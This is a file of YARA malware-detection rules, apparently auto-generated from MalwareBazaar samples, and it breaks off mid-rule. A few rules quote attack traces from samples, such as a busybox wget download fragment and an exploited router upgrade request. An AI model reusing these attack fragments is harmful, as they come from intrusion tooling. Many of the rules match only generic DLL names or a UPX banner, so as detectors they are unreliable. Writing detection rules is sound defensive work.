rule Windows_a8c24a3e54a4b323973f61630c92ecaad067598ef2547350c9d108bc175774b9
{
    meta:
        description = "Auto ML: a8c24a3e54a4b323973f61630c92ecaad067598ef2547350c9d108bc175774b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "WTSAPI32.dll"
        $s3 = "USER32.dll"
        $s4 = "2http://crl.comodoca.com/AAACertificateServices.crl04"
        $s5 = "http://ocsp.comodoca.com0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7855KB
        and all of them
}

rule Windows_11d22d4281f0d9b237379e7bc5b2f301ae94f9028d94d043cefe1c08636ce9fd
{
    meta:
        description = "Auto ML: 11d22d4281f0d9b237379e7bc5b2f301ae94f9028d94d043cefe1c08636ce9fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "ADVAPI32.DLL"
        $s3 = "USER32.DLL"
        $s4 = "KERNEL32.dll"
        $s5 = "KERNEL32.DLL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB
        and all of them
}

rule Windows_a8d74ed7b03a5b5b3b0d6d232d52b817b67be23e95e21eecac100b94ae05dfa6
{
    meta:
        description = "Auto ML: a8d74ed7b03a5b5b3b0d6d232d52b817b67be23e95e21eecac100b94ae05dfa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "CreateFileA"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6621KB
        and all of them
}

rule Linux_a910f10b9709bfc2fee427dd671a37b1b49823f820df5902aadf174c73533d71
{
    meta:
        description = "Auto ML: a910f10b9709bfc2fee427dd671a37b1b49823f820df5902aadf174c73533d71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB
        and all of them
}

rule Linux_a95c553ae1f438d8d07e40ec062ece319cce83feb4d94aba24aeb73483563363
{
    meta:
        description = "Auto ML: a95c553ae1f438d8d07e40ec062ece319cce83feb4d94aba24aeb73483563363"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB
        and all of them
}

rule Windows_a95da78668adc1684d19248f50fb7ccf6083806cce94f65d3ec3c99bca4662ab
{
    meta:
        description = "Auto ML: a95da78668adc1684d19248f50fb7ccf6083806cce94f65d3ec3c99bca4662ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ntdll.dll"
        $s2 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll"
        $s3 = "CreateFileA"
        $s4 = "CreateFileW"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1670KB
        and all of them
}

rule Windows_a98b58b58466facbdb0c65e4e6a0a9d1ed875c0a10fa94bde52e3aa726337d84
{
    meta:
        description = "Auto ML: a98b58b58466facbdb0c65e4e6a0a9d1ed875c0a10fa94bde52e3aa726337d84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ypBK.exe"
        $s2 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"
        $s3 = "mscoree.dll"
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 678KB
        and all of them
}

rule Windows_a9accaab2a3a2a724d811b2e1cf86a08ad3754dcb2eb325188ab1c2a7543341f
{
    meta:
        description = "Auto ML: a9accaab2a3a2a724d811b2e1cf86a08ad3754dcb2eb325188ab1c2a7543341f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "dEDP.exe"
        $s2 = "System.IO.Ports"
        $s3 = "mscoree.dll"
        $s4 = "Microsoft Sans Serif"
        $s5 = "Microsoft YaHei"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB
        and all of them
}

rule Windows_a9c22a3fe2856a1c2afeccaad1188e6e4fab5990b800bbe6d02212909dea8f2e
{
    meta:
        description = "Auto ML: a9c22a3fe2856a1c2afeccaad1188e6e4fab5990b800bbe6d02212909dea8f2e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "code_understanding_and_program_installation.exe"
        $s2 = "Microsoft.VisualBasic.ApplicationServices"
        $s3 = "Microsoft.VisualBasic"
        $s4 = "Microsoft.VisualBasic.Devices"
        $s5 = "System.IO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4744KB
        and all of them
}

rule Windows_a9dceb6c6c9faeb5788ff9dc3288a1ab2bd128b6765c817f82e967401e10f6e4
{
    meta:
        description = "Auto ML: a9dceb6c6c9faeb5788ff9dc3288a1ab2bd128b6765c817f82e967401e10f6e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ORGDEFgGgC.exe"
        $s2 = "System.IO"
        $s3 = "System.IO.Compression"
        $s4 = "mscoree.dll"
        $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 307KB
        and all of them
}

rule Windows_a9e0912c51dbd477ad269595657e9fc5d826e3d453fb83c9858bd76320a5a19e
{
    meta:
        description = "Auto ML: a9e0912c51dbd477ad269595657e9fc5d826e3d453fb83c9858bd76320a5a19e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "CreateFileA"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4761KB
        and all of them
}

rule Windows_a9e6b9acb3f74abf0583a5552591a22eb279fe3f96f9316ec4449bd9d7116030
{
    meta:
        description = "Auto ML: a9e6b9acb3f74abf0583a5552591a22eb279fe3f96f9316ec4449bd9d7116030"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.dll"
        $s2 = "WS2_32.dll"
        $s3 = "SHELL32.dll"
        $s4 = "GDI32.dll"
        $s5 = "WININET.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4816KB
        and all of them
}

rule Windows_11ec084af50a836c2c4e3c6af5c039de625ab989c1e015bb3b9fb8b662e76b3b
{
    meta:
        description = "Auto ML: 11ec084af50a836c2c4e3c6af5c039de625ab989c1e015bb3b9fb8b662e76b3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "comctl32.dll"
        $s3 = "shell32.dll"
        $s4 = "eCmd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5410KB
        and all of them
}

rule Windows_a9ed7edf5b5cecaecdf126bafc6c85d3ca918363d874f3c33afc07131bc43c4d
{
    meta:
        description = "Auto ML: a9ed7edf5b5cecaecdf126bafc6c85d3ca918363d874f3c33afc07131bc43c4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft.VisualBasic"
        $s2 = "oSV.exe"
        $s3 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"
        $s4 = "mscoree.dll"
        $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB
        and all of them
}

rule Linux_aa03a988d8b7a00e62e62c8f29c72ac5db583f3ef307860e05bb2da31b532068
{
    meta:
        description = "Auto ML: aa03a988d8b7a00e62e62c8f29c72ac5db583f3ef307860e05bb2da31b532068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB
        and all of them
}

rule Windows_aa29b800e8a344b2917de03c2c6fac3e02730eb46e2a1215bb97f6daef1588a6
{
    meta:
        description = "Auto ML: aa29b800e8a344b2917de03c2c6fac3e02730eb46e2a1215bb97f6daef1588a6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.dll"
        $s2 = "CreateFileW"
        $s3 = "sC:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s4 = "kernel32"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 690KB
        and all of them
}

rule Windows_aa2e39c3f1f594f06b32a7f129a715271dd03fb65f7ae2df575fe8af510e4e5a
{
    meta:
        description = "Auto ML: aa2e39c3f1f594f06b32a7f129a715271dd03fb65f7ae2df575fe8af510e4e5a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "KERNEL32"
        $s3 = "USER32.DLL"
        $s4 = "msimg32.dll"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB
        and all of them
}

rule Windows_aa33870935c58f52e135185cea818070c6b4bc4409f5dbc1ed99168c86c0fdef
{
    meta:
        description = "Auto ML: aa33870935c58f52e135185cea818070c6b4bc4409f5dbc1ed99168c86c0fdef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Diagram.exe"
        $s2 = "QueryCmd"
        $s3 = "Gdi32"
        $s4 = "User32"
        $s5 = "System.IO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 288KB
        and all of them
}

rule Windows_aa3f635e15b1e53709d01a66e31958b649d40122541f1aa207805f0ce31f0fe9
{
    meta:
        description = "Auto ML: aa3f635e15b1e53709d01a66e31958b649d40122541f1aa207805f0ce31f0fe9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "set_UseShellExecute"
        $s3 = "Microsoft.CSharp"
        $s4 = "Microsoft.VisualBasic"
        $s5 = "Microsoft.Win32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB
        and all of them
}

rule Windows_aa5ac6cee2917246b3713a6ecd71452c2669cb5385f392a1b6594a887be616a6
{
    meta:
        description = "Auto ML: aa5ac6cee2917246b3713a6ecd71452c2669cb5385f392a1b6594a887be616a6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "Microsoft.VisualBasic"
        $s3 = "CinemaHallSimulation.exe"
        $s4 = "kernel32.dll"
        $s5 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1772KB
        and all of them
}

rule Windows_aa60573d3d1a56190858edb2df0344b9d1082f0eae840004941a1d6b30a1b804
{
    meta:
        description = "Auto ML: aa60573d3d1a56190858edb2df0344b9d1082f0eae840004941a1d6b30a1b804"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "Microsoft.VisualBasic"
        $s3 = "Stub.exe"
        $s4 = "Microsoft.VisualBasic.Devices"
        $s5 = "Microsoft.VisualBasic.ApplicationServices"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 406KB
        and all of them
}

rule Windows_aaa87e001ad26d24cc977adb90d0c6224a31a147689903cb66f8b8ac9c857003
{
    meta:
        description = "Auto ML: aaa87e001ad26d24cc977adb90d0c6224a31a147689903cb66f8b8ac9c857003"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CreateFileA"
        $s2 = "RegOpenKeyExA"
        $s3 = "wsock32.dll"
        $s4 = "ole32.DLL"
        $s5 = "OLEAUT32.DLL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 280KB
        and all of them
}

rule Linux_aae93026d0c51a595061128f3ac36084ee958c7a919f57b3fdcdda30696b6fcb
{
    meta:
        description = "Auto ML: aae93026d0c51a595061128f3ac36084ee958c7a919f57b3fdcdda30696b6fcb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "/proc/%d/cmdline"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 134KB
        and all of them
}

rule Linux_0123fe36cfdc574d6b73573aee5c1a4ccdd66027beceb5d9dac4914e5b2efbb6
{
    meta:
        description = "Auto ML: 0123fe36cfdc574d6b73573aee5c1a4ccdd66027beceb5d9dac4914e5b2efbb6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/usr/*"
        $s2 = "shell"
        $s3 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s4 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s5 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB
        and all of them
}

rule Windows_120b4cf74b478310991b88f2334efb065296fcd67ac3ea408d54ad3052f2d908
{
    meta:
        description = "Auto ML: 120b4cf74b478310991b88f2334efb065296fcd67ac3ea408d54ad3052f2d908"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "advapi32.dll"
        $s2 = "setupx.dll"
        $s3 = "setupapi.dll"
        $s4 = ".BAT"
        $s5 = "advpack.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6052KB
        and all of them
}

rule Windows_aafa82fb621b4843c3ae89bb8beddfe66244e203149880b79a4e8f42f5a7c4b9
{
    meta:
        description = "Auto ML: aafa82fb621b4843c3ae89bb8beddfe66244e203149880b79a4e8f42f5a7c4b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ADVAPI32.dll"
        $s2 = "KERNEL32.dll"
        $s3 = "NTDLL.DLL"
        $s4 = "GDI32.dll"
        $s5 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 369KB
        and all of them
}

rule Linux_ab0dd7675c9e379aea6638f7b2f0f2d4ef226bb189575894840d0e4480aac63a
{
    meta:
        description = "Auto ML: ab0dd7675c9e379aea6638f7b2f0f2d4ef226bb189575894840d0e4480aac63a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB
        and all of them
}

rule Windows_ab143dacd2bb2cc4c38822ad99b628b5c763b8ea2b01ac6971c7dbf0bdc41fb2
{
    meta:
        description = "Auto ML: ab143dacd2bb2cc4c38822ad99b628b5c763b8ea2b01ac6971c7dbf0bdc41fb2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32"
        $s2 = "System.IO"
        $s3 = "HttpStatusCode"
        $s4 = "HttpWebResponse"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 40KB
        and all of them
}

rule Linux_ab74f0b951d0f7862d3f21786d05e13857ece4f306ba78b5c58ec98ad3ea69a4
{
    meta:
        description = "Auto ML: ab74f0b951d0f7862d3f21786d05e13857ece4f306ba78b5c58ec98ad3ea69a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB
        and all of them
}

rule Linux_ab815a4a83fe7d5213b6e5a80d0845f2055d49330fd36fe5d873604eb1b249b7
{
    meta:
        description = "Auto ML: ab815a4a83fe7d5213b6e5a80d0845f2055d49330fd36fe5d873604eb1b249b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/usr/bin/apt-get"
        $s2 = "/usr/lib/portage"
        $s3 = "/usr/bin/yum"
        $s4 = "/usr/share/YaST2"
        $s5 = "/usr/local/etc/pkg"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 142KB
        and all of them
}

rule Windows_ab9f7995b911511781cfb226027d60173f2ab8f6482372f51756fa40d93b2f59
{
    meta:
        description = "Auto ML: ab9f7995b911511781cfb226027d60173f2ab8f6482372f51756fa40d93b2f59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Kingdom.exe"
        $s2 = "kernel32.dll"
        $s3 = "System.IO"
        $s4 = "kernel32"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 434KB
        and all of them
}

rule Windows_abc8131003a1ec8b9a4a6e9a477392d7fef6b866bbdafdcc08d94b7b760e3a2d
{
    meta:
        description = "Auto ML: abc8131003a1ec8b9a4a6e9a477392d7fef6b866bbdafdcc08d94b7b760e3a2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "*Microsoft (R) JScript Compiler version {0}"
        $s2 = ",for Microsoft (R) .NET Framework version {0}"
        $s3 = "CCopyright (C) Microsoft Corporation 1996-2005. All rights reserved."
        $s4 = "System.IO"
        $s5 = "Microsoft.JScript.Vsa"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 538KB
        and all of them
}

rule Linux_abf520ca91767dbfd1b806f097db517ef8d51a8031b2a20fba275d68f25ec502
{
    meta:
        description = "Auto ML: abf520ca91767dbfd1b806f097db517ef8d51a8031b2a20fba275d68f25ec502"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "http"
        $s3 = "HTTP/1.1 404 Not Found"
        $s4 = "HTTP/1.1 200 OK"
        $s5 = "GET /%s HTTP/1.0"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB
        and all of them
}

rule Windows_ac1ca9910b47c73f279ec42a5bbfc19424805f8dcbd8457d7ef32199219ff70d
{
    meta:
        description = "Auto ML: ac1ca9910b47c73f279ec42a5bbfc19424805f8dcbd8457d7ef32199219ff70d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "CreateFileA"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4701KB
        and all of them
}

rule Windows_ac4ec4cbcf33cf34aaba7c7b1b29c629a6496fc4715037e97a69de1f2cbf0ff7
{
    meta:
        description = "Auto ML: ac4ec4cbcf33cf34aaba7c7b1b29c629a6496fc4715037e97a69de1f2cbf0ff7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "libgcc_s_dw2-1.dll"
        $s2 = "ntdll.dll"
        $s3 = "NtCreateFile"
        $s4 = "KERNEL32.dll"
        $s5 = "msvcrt.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 60KB
        and all of them
}

rule Windows_120c0317f33b1f2d23354d55410f22ea28814cdcb1597d281a3c2ab87219440a
{
    meta:
        description = "Auto ML: 120c0317f33b1f2d23354d55410f22ea28814cdcb1597d281a3c2ab87219440a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "user32"
        $s2 = "kernel32.dll"
        $s3 = "user32.dll"
        $s4 = "kernel32"
        $s5 = "MS Shell Dlg"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 660KB
        and all of them
}

rule Linux_ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753
{
    meta:
        description = "Auto ML: ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "usybox wget -g 193.23"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

rule Windows_acfbcffe5730ef33a9497e56f399bac48fd85646f4320caa3cdc9445472cbff0
{
    meta:
        description = "Auto ML: acfbcffe5730ef33a9497e56f399bac48fd85646f4320caa3cdc9445472cbff0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s2 = "MicrosoftCertTemplateV1"
        $s3 = "Http_1_1"
        $s4 = "kernel32"
        $s5 = "Microsoft.Win32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Linux_ad01190688201cac6b5815d670066f247f34b50d7dd2ff40b05ae85d204f850e
{
    meta:
        description = "Auto ML: ad01190688201cac6b5815d670066f247f34b50d7dd2ff40b05ae85d204f850e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%s %s HTTP/1.1"
        $s2 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s3 = "/usr/bin/python"
        $s4 = "/usr/bin/python3"
        $s5 = "/usr/bin/perl"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 92KB
        and all of them
}

rule Linux_ad0dd692f4de9d060a918c63ded562d8cb8b8217fc6831fa46aac15c0fdb422b
{
    meta:
        description = "Auto ML: ad0dd692f4de9d060a918c63ded562d8cb8b8217fc6831fa46aac15c0fdb422b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Linux_ad804a6b102674a2ad43a40be16385324ec53bb6a1e56ebd4f5fec1ca208e245
{
    meta:
        description = "Auto ML: ad804a6b102674a2ad43a40be16385324ec53bb6a1e56ebd4f5fec1ca208e245"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/bin/sh"
        $s2 = "%s /%s HTTP/1.1"
        $s3 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s4 = "HTTP"
        $s5 = "/usr/bin/python"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 140KB
        and all of them
}

rule Windows_adb4413373b3a814a8b2268bfb098c81459ddd0f755b4d2a7972432cfbdcf5cf
{
    meta:
        description = "Auto ML: adb4413373b3a814a8b2268bfb098c81459ddd0f755b4d2a7972432cfbdcf5cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "1DSFEWRWE.exe"
        $s2 = "mscoree.dll"
        $s3 = "    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">"
        $s4 = "            <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">"
        $s5 = "powershell"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Android_adb7cba1d60f35b90d8d178da2eac4a157e5d05f78914847584022cdf3c91afa
{
    meta:
        description = "Auto ML: adb7cba1d60f35b90d8d178da2eac4a157e5d05f78914847584022cdf3c91afa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cmdccC&"
        $s2 = "!!shellsoezbcubquclvrzsjrkacdtgh287"
        $s3 = "REPO=https://github.com/REAndroid/APKEditor"
        $s4 = "https://github.com/REAndroid/ARSCLib"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3873KB
        and all of them
}

rule Windows_add8f6dd03aacc83d719d518343a9e3b150b6e23392c491c3ace8362b1c52740
{
    meta:
        description = "Auto ML: add8f6dd03aacc83d719d518343a9e3b150b6e23392c491c3ace8362b1c52740"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "advapi32.dll"
        $s2 = "setupx.dll"
        $s3 = "setupapi.dll"
        $s4 = ".BAT"
        $s5 = "advpack.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1445KB
        and all of them
}

rule Windows_ae4f8c4cf49d93930683e363a285cd39f8d2e2a1bc4ae8e94fe44d8a6d085eff
{
    meta:
        description = "Auto ML: ae4f8c4cf49d93930683e363a285cd39f8d2e2a1bc4ae8e94fe44d8a6d085eff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CreateFileA"
        $s2 = "_acmdln"
        $s3 = "KERNEL32.dll"
        $s4 = "msvcrt.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB
        and all of them
}

rule Windows_ae7a22bede40e897e2d01ac036f9f16f283082e34ef868443621545ec21d5753
{
    meta:
        description = "Auto ML: ae7a22bede40e897e2d01ac036f9f16f283082e34ef868443621545ec21d5753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Tori.exe"
        $s2 = "kernel32.dll"
        $s3 = "System.IO"
        $s4 = "cmd2"
        $s5 = "Microsoft Corporation"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 735KB
        and all of them
}

rule Windows_123c4f2b6906e48abd2d541d78d10500e458804bfd9f83650d1a748511a7857f
{
    meta:
        description = "Auto ML: 123c4f2b6906e48abd2d541d78d10500e458804bfd9f83650d1a748511a7857f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "gdi32"
        $s2 = "user32"
        $s3 = "QCmdE"
        $s4 = "System.IO"
        $s5 = "Nullet.exe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1209KB
        and all of them
}

rule Linux_ae9af46d1534c25940cd5ed2770925749487782a176fc95de9437bd86acbb444
{
    meta:
        description = "Auto ML: ae9af46d1534c25940cd5ed2770925749487782a176fc95de9437bd86acbb444"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Linux_aec176a9c4563b039872b19219404e0e362c0b098d87fb8f17a4e904119531db
{
    meta:
        description = "Auto ML: aec176a9c4563b039872b19219404e0e362c0b098d87fb8f17a4e904119531db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
